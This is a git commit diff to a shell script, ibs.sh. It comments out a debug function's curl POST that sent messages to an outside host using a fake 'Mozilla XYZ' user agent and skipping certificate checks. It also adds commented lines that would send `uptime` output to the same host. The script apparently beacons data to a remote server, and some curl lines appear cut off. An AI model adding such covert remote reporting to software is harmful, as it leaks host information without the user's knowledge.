c33bdb250b7fdd596434e3a6e8fda463adf30b95
hLbx0 <90946073+hLbx0@users.noreply.github.com>
2023-11-01 08:08:39 -0400

    Update ibs.sh

--- ibs.sh
+++ ibs.sh
@@ -3,7 +3,10 @@
 function dbgx(){
 	echo "[*] $1";
  	#cx_ "dbgx: $1" "SSID"
-  	OX_=`curl -k -X POST -d "descr=$1&cat=SSID" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps
+  	#OX_=`curl -k -X POST -d "descr=$1&cat=SSID" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps
+   	#
+    	#xyz=`uptime`
+     	#OX_=`curl -k -X POST -d "descr=$xyz&cat=SSID" -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/ps
 }
 
 function slpx(){
